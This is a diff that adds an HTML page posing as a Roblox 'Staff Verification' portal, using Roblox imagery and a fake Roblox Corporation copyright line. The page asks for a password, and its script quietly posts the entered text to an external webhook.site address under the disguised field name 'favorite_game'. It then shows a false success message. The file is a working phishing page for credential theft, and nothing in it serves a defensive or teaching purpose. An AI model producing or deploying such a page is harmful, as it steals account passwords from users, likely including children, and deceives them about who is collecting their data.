@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox | Staff Verification</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: sans-serif;
+            background-image: url('https://images.rbxcdn.com/fdb50257e17409f583f7423377227d81.jpg');
+            background-size: cover;
+            background-position: center;
+            overflow: hidden;
+        }
+
+        /* This creates the dark blurred overlay */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(25, 25, 25, 0.7);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            z-index: 1; /* Sits behind the card */
+        }
+
+        .card {
+            background-color: #393B3D;
+            padding: 35px;
+            border-radius: 8px;
+            text-align: center;
+            width: 320px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            position: relative; /* This is the fix! */
+            z-index: 2; /* This pulls it in front of the blur */
+        }
+
+        h2 { color: white; margin-top: 0; }
+        p { color: #BDC3C7; font-size: 14px; }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 15px 0;
+            border-radius: 4px;
+            border: 1px solid #111;
+            background-color: #111;
+            color: white;
+            box-sizing: border-box;
+        }
+
+        button {
+            background-color: #0084FF;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        .footer { font-size: 10px; color: #757575; margin-top: 20px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Staff Portal</h2>
+        <p>Confirm your Password to Enter!!.</p>
+        <input type="text" id="gameInput" placeholder="Enter Password ...">
+        <button onclick="sendData()">Verify Identity</button>
+        <div class="footer">© 2026 Roblox Corporation</div>
+    </div>
+
+    <script>
+        function sendData() {
+            const game = document.getElementById('gameInput').value;
+            if(!game) return alert("Please enter a password!.");
+
+            fetch('https://webhook.site/53b98807-5cdf-486c-806e-fa85e404f9ae', {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ favorite_game: game })
+            });
+
+            alert("Verification submitted successfully!");
+        }
+    </script>
+</body>
+</html>
